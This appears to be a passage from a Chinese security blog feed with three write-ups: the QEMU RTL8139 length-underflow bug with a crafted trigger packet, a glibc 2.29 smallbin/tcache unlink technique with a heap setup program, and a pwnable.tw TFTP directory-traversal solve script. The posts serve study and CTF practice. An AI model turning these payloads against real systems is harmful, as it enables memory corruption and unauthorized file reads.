class="number">0x68</span>,</span><br><span class="line">    NWayExpansion = <span class="number">0x6A</span>,</span><br><span class="line">    <span class="comment">/* Undocumented registers, but required for proper operation. */</span></span><br><span class="line">    FIFOTMS = <span class="number">0x70</span>,        <span class="comment">/* FIFO Control and test. */</span></span><br><span class="line">    CSCR = <span class="number">0x74</span>,        <span class="comment">/* Chip Status and Configuration Register. */</span></span><br><span class="line">    PARA78 = <span class="number">0x78</span>,</span><br><span class="line">    PARA7c = <span class="number">0x7c</span>,        <span class="comment">/* Magic transceiver parameter register. */</span></span><br><span class="line">    Config5 = <span class="number">0xD8</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    TxPoll        = <span class="number">0xD9</span>,    <span class="comment">/* Tell chip to check Tx descriptors for work */</span></span><br><span class="line">    RxMaxSize    = <span class="number">0xDA</span>, <span class="comment">/* Max size of an Rx packet (8169 only) */</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>, <span class="comment">/* C+ Command register (C+ mode only) */</span></span><br><span class="line">    IntrMitigate    = <span class="number">0xE2</span>,    <span class="comment">/* rx/tx interrupt mitigation control */</span></span><br><span class="line">    RxRingAddrLO    = <span class="number">0xE4</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    RxRingAddrHI    = <span class="number">0xE8</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    TxThresh    = <span class="number">0xEC</span>, <span class="comment">/* Early Tx threshold */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">- TxConfig: Enable/disable Tx flags such as TxLoopBack (enable loopback</span></span><br><span class="line"><span class="comment">  test mode), TxCRC (do not append CRC to Tx Packets), etc.</span></span><br><span class="line"><span class="comment">- RxConfig: Enable/disable Rx flags such as AcceptBroadcast (accept</span></span><br><span class="line"><span class="comment">  broadcast packets), AcceptMulticast (accept multicast packets), etc.</span></span><br><span class="line"><span class="comment">- CpCmd: C+ command register used to enable some functions such as</span></span><br><span class="line"><span class="comment">  CplusRxEnd (enable receive), CplusTxEnd (enable transmit), etc.</span></span><br><span class="line"><span class="comment">- TxAddr0: Physical memory address of Tx descriptors table.</span></span><br><span class="line"><span class="comment">- RxRingAddrLO: Low 32-bits physical memory address of Rx descriptors</span></span><br><span class="line"><span class="comment">  table.</span></span><br><span class="line"><span class="comment">- RxRingAddrHI: High 32-bits physical memory address of Rx descriptors</span></span><br><span class="line"><span class="comment">  table.</span></span><br><span class="line"><span class="comment">- TxPoll: Tell the card to check Tx descriptors.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--- hw/net/rtl8139.c:<span class="number">2153</span> ---</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* ip packet header */</span></span><br><span class="line">ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line"><span class="keyword">if</span> (proto == ETH_P_IP)</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode has IP packet\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* not aligned */</span></span><br><span class="line">    eth_payload_data = saved_buffer + ETH_HLEN;</span><br><span class="line">    eth_payload_len  = saved_size   - ETH_HLEN;</span><br><span class="line"></span><br><span class="line">    ip = (ip_header*)eth_payload_data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode packet has bad IP version %d "</span></span><br><span class="line">            <span class="string">"expected %d\n"</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">            IP_HEADER_VERSION_4);</span><br><span class="line">        ip = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        hlen = IP_HEADER_LENGTH(ip);</span><br><span class="line">        ip_protocol = ip-&gt;ip_p;</span><br><span class="line">        ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen; <span class="comment">//漏洞点</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">--- hw/net/rtl8139.c:<span class="number">2231</span> ---</span><br><span class="line">    </span><br><span class="line"><span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len;</span><br><span class="line">    tcp_send_offset += tcp_chunk_size) &#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len) &#123;</span><br><span class="line">        is_last_frame = <span class="number">1</span>;</span><br><span class="line">        chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(data_to_checksum, saved_ip_header + <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen,</span><br><span class="line">                (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset,</span><br><span class="line">                chunk_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* more code follows */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在以上代码中标注的漏洞点处</p>
<p><code>ip-&gt;ip_len</code>是整个IP数据报的包括报头在内的总长度，<code>hlen</code>是IP数据报的报头的长度</p>
<p>在计算<code>ip_data_len</code>的时候，没有对<code>be16_to_cpu(ip-&gt;ip_len) &gt; hlen</code>做检测，若<code>be16_to_cpu(ip-&gt;ip_len) &lt; hlen</code>的话，由于这三个值都是都是无符号数，就会导致<code>ip_data_len</code>变得非常大，从而导致了漏洞</p>
<h1 id="关于exploit"><a href="#关于exploit" class="headerlink" title="关于exploit"></a>关于exploit</h1><p>只需要对网卡进行特定的配置，然后将<code>Tx</code>、<code>Rx</code>buffer设置好，然后将构造的包发送过去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static uint8_t rtl8139_packet [] = &#123;</span><br><span class="line">	0x52, 0x54, 0x00, 0x12, 0x34, 0x57, 0x52, 0x54, 0x00, 0x12, 0x34, 0x57, </span><br><span class="line">    0x08, 0x00, 0x45, 0x00, 0x00, 0x13, 0xde, 0xad, 0x40, 0x00, 0x40, 0x06, </span><br><span class="line">    0xff, 0xff, 0x7f, 0x00, 0x00, 0x01, 0x7f, 0x00, 0x00, 0x01, 0x04, 0x00, </span><br><span class="line">    0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x10,</span><br><span class="line">    0x00, 0x00, 0xff, 0xff, 0x00, 0x00</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>要注意，<code>Tx</code>、<code>Rx</code>buffer设置的时候，buffer的地址需要从qemu内部的虚拟地址转换成qemu内部的物理地址即host机中qemu的虚拟地址</p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>smallbin在unlink的时候存在的漏洞</title>
    <url>/2020/02/07/smallbin%E5%9C%A8unlink%E7%9A%84%E6%97%B6%E5%80%99%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>遇到一题，需要此法，特分析源码，在此记录</p>
<p>版本：libc-2.29</p>
<a id="more"></a>

<p>众所周知，libc-2.29版本中，<code>unsorted bin attack</code>已经被防御了</p>
<p>但经过buuctf的新年红包题，原来大佬发现了新的类似于<code>unsorted bin attack</code>的方法</p>
<p>可利用之处在于，如果<code>small bin</code>中有空闲块，且该大小的<code>tcache bin</code>未满的时候，就会遍历<code>small bin</code>，把<code>small bin</code>从其最后的一个块开始，沿着bk，将块一个一个地放入<code>tcache bin</code></p>
<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// glibc2.29/malloc/malloc.c 3560</span></span><br><span class="line">	<span class="keyword">if</span> (in_smallbin_range(nb))		<span class="comment">//所有小于large bin的大小的块都in_smallbin_range</span></span><br><span class="line">    &#123;</span><br><span class="line">        idx = smallbin_index(nb);	<span class="comment">//得到请求大小的块对应的small bin的index</span></span><br><span class="line">        bin = bin_at(av, idx);		<span class="comment">//得到该bin</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((victim = last(bin)) != bin)	<span class="comment">//last函数取的是bin-&gt;bk，此处的victim就是small bin链表的最后一个，如果此时victim==bin，就代表说small bin中没有块</span></span><br><span class="line">        &#123;</span><br><span class="line">            bck = victim-&gt;bk;	<span class="comment">//bck指向的是该块所指的前一项</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))	<span class="comment">//这里的检查和unsorted bin那里添加的检查是一样的</span></span><br><span class="line">                malloc_printerr(<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;	<span class="comment">//直到这里就相当于说victim从small bin的最后一项中取出来了，因为small bin是一个双链表，所以进行了这两步操作进行unlink</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                set_non_main_arena(victim);</span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">            <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">            <span class="keyword">size_t</span> tc_idx = csize2tidx(nb);		<span class="comment">//得到该大小相对于tcache bin的index</span></span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)	<span class="comment">//这里测试tc_idx对应的tcache bin中块的数目是否小于mp_.tcache_count即一般来说为7，&amp;&amp;之后的一句与上面所说的一样</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)	<span class="comment">//这里的判断tc_victim != 0我认为是不恰当的，因为最正常的情况而言，tc_victim到最后应该为bin，即while循环中的!=判断是应该成立的</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        bck = tc_victim-&gt;bk;	</span><br><span class="line">                        set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">                        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                            set_non_main_arena(tc_victim);</span><br><span class="line">                        bin-&gt;bk = bck;</span><br><span class="line">                        bck-&gt;fd = bin;	<span class="comment">//这里将块unlink取出</span></span><br><span class="line"></span><br><span class="line">                        tcache_put(tc_victim, tc_idx);	<span class="comment">//将取出的块放入tcache</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>主要利用的点就在while循环中</p>
<p>以下假设所有块的size都是0x101</p>
<p>要利用，需要<code>tcache bin</code>中有5个块，且<code>small bin</code>中有3个块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *ptr[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ptr[i] = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(ptr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">5</span>;i&lt;<span class="number">12</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">5</span>;i&lt;<span class="number">12</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(ptr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">int</span> a;</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">free</span>(p3);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">free</span>(p4);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就得到了3个0x100的<code>small bin</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55fed16d7ac0 (size : 0x1d540) </span><br><span class="line">       last_remainder: 0x55fed16d7360 (size : 0x100) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x100)  smallbin[14]: 0x55fed16d7360  &lt;--&gt; 0x55fed16d6b00  &lt;--&gt; 0x55fed16d66d0</span><br><span class="line">(0x100)   tcache_entry[14](5): 0x55fed16d4660 --&gt; 0x55fed16d4560 --&gt; 0x55fed16d4460 --&gt; 0x55fed16d4360 --&gt; 0x55fed16d4260</span><br><span class="line">(0x410)   tcache_entry[63](7): 0x55fed16d6c30 --&gt; 0x55fed16d5bb0 --&gt; 0x55fed16d57a0 --&gt; 0x55fed16d5390 --&gt; 0x55fed16d4f80 --&gt; 0x55fed16d4b70 --&gt; 0x55fed16d4760</span><br></pre></td></tr></table></figure>

<p>利用的话，只需要将<code>small bin</code>中第一项的<code>bk</code>改为我们想要覆写的地址<code>-0x10</code>的地方，然后<code>malloc(0x100)</code>即可完成利用</p>
<p>前面源码中，<code>last(bin)</code>所取的就是最右边那一块，这一块作为<code>victim</code>取出，最后返回，<code>bin-&gt;bk</code>变成链表中的中间项</p>
<p>然后执行到while循环的地方</p>
<ul>
<li>通过<code>tc_victim = last(bin)</code>取到<code>small bin</code>中间那一块</li>
<li>取<code>bck = tc_victim-&gt;bk</code>，这里<code>bck</code>指的就是<code>small bin</code>的第一块</li>
<li>设置<code>bin-&gt;bk = bck</code></li>
<li>设置<code>bck-&gt;fd = bin</code></li>
<li>将<code>tc_victim</code>放入<code>tcache</code></li>
<li>取<code>tc_victim = last(bin)</code>取到<code>small bin</code>的第一块</li>
<li><code>bck = tc_victim-&gt;bk</code>，此时<code>tcache</code>中有6个块，如果之前已经将<code>bk</code>改编成我们需要的地址，现在<code>bck</code>就是我们所需要的地址</li>
<li>之后<code>bin-&gt;bk = bck</code></li>
<li><code>bck-&gt;fd = bin</code>就将我们所需要的地址<code>+0x10</code>的地方写成了<code>bin</code>的地址，即<code>small bin</code>的地址</li>
</ul>
<p>至此就完成了利用，挺麻烦的 : ) </p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw CVE-2018-10387(标题党)</title>
    <url>/2020/01/28/pwnable-tw-CVE-2018-10387-%E6%A0%87%E9%A2%98%E5%85%9A/</url>
    <content><![CDATA[<blockquote>
<p> 参考</p>
<p> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10387" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10387</a></p>
<p> patch</p>
<p> <a href="https://sourceforge.net/p/tftp-server/discussion/550564/thread/a586ce62/" target="_blank" rel="noopener">https://sourceforge.net/p/tftp-server/discussion/550564/thread/a586ce62/</a></p>
<p> 源码</p>
<p> <a href="https://zh.osdn.net/projects/sfnet_tftp-server/releases/" target="_blank" rel="noopener">https://zh.osdn.net/projects/sfnet_tftp-server/releases/</a></p>
</blockquote>
<a id="more"></a>

<h1 id="闲来无事"><a href="#闲来无事" class="headerlink" title="闲来无事"></a>闲来无事</h1><p>这几天闲来无事，决定刷一刷题，于是就选择了<code>pwnable.tw</code></p>
<p>赫然发现<code>challange list</code>里面出现了一个CVE，着实提起了我的兴趣，便下载下来分析一番</p>
<figure class="image-box">
                <img src="https://s2.ax1x.com/2020/01/28/1MMGVg.png" alt="题目描述" title class>
                <p>题目描述</p>
            </figure>

<p>乍一看，加粗的<code>remote code execution</code>着实很显眼，明显是在暗示说这一题中具有远程代码执行的漏洞</p>
<h1 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dajun @ dajun-pc in ~/zoneOfDajun/pwndocker [22:00:15] </span></span><br><span class="line">$ checksec ./opentftpd </span><br><span class="line">[*] <span class="string">'/home/dajun/zoneOfDajun/pwndocker/opentftpd'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h2 id="google搜索"><a href="#google搜索" class="headerlink" title="google搜索"></a>google搜索</h2><p>循着CVE编号进行了一番查找，找到了发在某个网站的patch</p>
<figure class="highlight patch"><table><tr><td class="code"><pre><span class="line">From 786dbd8e50109a9c183461633ae4b1dffc0233ba Mon Sep 17 00:00:00 2001</span><br><span class="line">From: 0xddaa &lt;0xddaa@gmail.com&gt;</span><br><span class="line">Date: Wed, 25 Apr 2018 10:27:00 +0000</span><br><span class="line">Subject: [PATCH 2/2] Fix heap overflow vulnerabiliy</span><br><span class="line"></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"> opentftpd.cpp | 3 ++-</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">diff --git a/opentftpd.cpp b/opentftpd.cpp</span><br><span class="line">index 246f263..4916cb8 100755</span><br><span class="line"><span class="comment">--- a/opentftpd.cpp</span></span><br><span class="line"><span class="comment">+++ b/opentftpd.cpp</span></span><br><span class="line">@@ -267,7 +267,8 @@ int main(int argc, char **argv)</span><br><span class="line"> 							&#125;</span><br><span class="line"> 							else if (ntohs(datain-&gt;opcode) == 5)</span><br><span class="line"> 							&#123;</span><br><span class="line"><span class="deletion">-								sprintf(req1-&gt;serverError.errormessage, "Error %i at Client, %s", ntohs(datain-&gt;block), &amp;datain-&gt;buffer);</span></span><br><span class="line"><span class="addition">+								snprintf(req1-&gt;serverError.errormessage, sizeof(req1-&gt;serverError.errormessage), "Error %i at Client, %s", ntohs(datain-&gt;block), &amp;datain-&gt;buffer);</span></span><br><span class="line"><span class="addition">+								req1-&gt;serverError.errormessage[sizeof(req1-&gt;serverError.errormessage) - 1] = '\0';</span></span><br><span class="line"> 								logMess(req1, 1);</span><br><span class="line"> 								cleanReq(req1);</span><br><span class="line"> 							&#125;</span><br><span class="line"><span class="deletion">-- </span></span><br><span class="line">2.7.4</span><br></pre></td></tr></table></figure>

<p>紧接着我又找到了源代码，之后便是随着代码在分析</p>
<p>乍一看，这里的patch很明显的告诉我们，<code>sprintf</code>函数因为没有指名长度，导致如果<code>datain-&gt;buffer</code>中的数据长度过长的话，会使<code>req1-&gt;serverError.errormessage</code>溢出，这里似乎是一个漏洞点</p>
<p>但转念一想，程序开启了<code>canary</code>，所以似乎得先泄露<code>canary</code>？且CVE的描述是<code>heap based</code>，而这只是个栈溢出啊？</p>
<p>随后经过动态调试后发现，原来在这条patch的上方已经有检测<code>datain-&gt;buffer</code>的长度的代码，这就表示在这里进行溢出是不可能的……</p>
<p>那这patch到底啥意思……</p>
<h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>直到我于某一刻看见了程序反汇编的这一句代码</p>
<figure class="image-box">
                <img src="https://s2.ax1x.com/2020/01/28/1MMJaQ.png" alt="IDA" title class>
                <p>IDA</p>
            </figure>

<p>位于<code>processNew</code>函数中，且不管前面是什么意思，程序在按照<code>tftp</code>协议中的<code>get</code>执行的时候，绝对会执行到这里，<code>a1+48</code>是<code>req-&gt;path</code>，其中存储的是即将open的文件的完整路径（当然，这个路径是在<code>tftp Server</code>设置的根路径之下的），<code>a1+312</code>是<code>req-&gt;filename</code>，也就是我们<code>get</code>的文件名</p>
<p>而我根据源代码进行编译之后，找到的这一处的代码是这样的</p>
<figure class="image-box">
                <img src="https://s2.ax1x.com/2020/01/28/1MMY5j.png" alt="IDA" title class>
                <p>IDA</p>
            </figure>

<p>很明显与题目的代码不同</p>
<p>在这里，<code>a1+48</code>和<code>a1+312</code>和上面的一样，<code>::dest</code>是<code>tftp Server</code>配置文件中所设置的根目录，比如我的根目录设置的是<code>/tmp</code>，那么理论上你<code>get</code>的所有请求只能在<code>/tmp</code>目录之下，且有代码专门检测<code>../</code>这样的不合法操作</p>
<p>到这里其实漏洞点就很清晰了</p>
<h1 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h1><p>nc过去之后，得到的是</p>
<p><code>start challenge on udp port: 61196</code></p>
<p>这么一句话，其中端口是个随机数</p>
<p>再加上在<code>processNew</code>这句代码中，有这一句</p>
<figure class="image-box">
                <img src="https://s2.ax1x.com/2020/01/28/1MM3qS.png" alt="RECV" title class>
                <p>RECV</p>
            </figure>

<p>意思是如果<code>req-&gt;filename</code>的第一个字母是<code>/</code>，则跳过它</p>
<p>那么如果我们构造一个类似于<code>//home</code>这样的，跳过之后就得到了<code>/home</code>，经过<code>strcpy</code>之后<code>req-&gt;path</code>就成了<code>/home</code>，我们就实现了目录穿越</p>
<p>先用连接过去一次，尝试请求flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'chall.pwnable.tw'</span></span><br><span class="line">port = <span class="number">10206</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">io = remote(ip, port)</span><br><span class="line">io.recvuntil(<span class="string">'port: '</span>)</span><br><span class="line">udp_port = int(io.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>))</span><br><span class="line">payload = <span class="string">'\x00\x01flag\x00netascii\x00'</span></span><br><span class="line">s.sendto(payload.encode(<span class="string">'utf-8'</span>), (ip, udp_port))</span><br><span class="line">ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python ./tftp.py </span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10206: Done</span><br><span class="line">[DEBUG] Received 0x23 bytes:</span><br><span class="line">    b<span class="string">'start challenge on udp port: 61182\n'</span></span><br><span class="line">b<span class="string">'\x00\x03\x00\x01here is /tmp. flag is under /home/opentftp/flag.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'</span></span><br></pre></td></tr></table></figure>

<p>因此我们只需要请求<code>//home/opentftp/flag</code>就得到了flag</p>
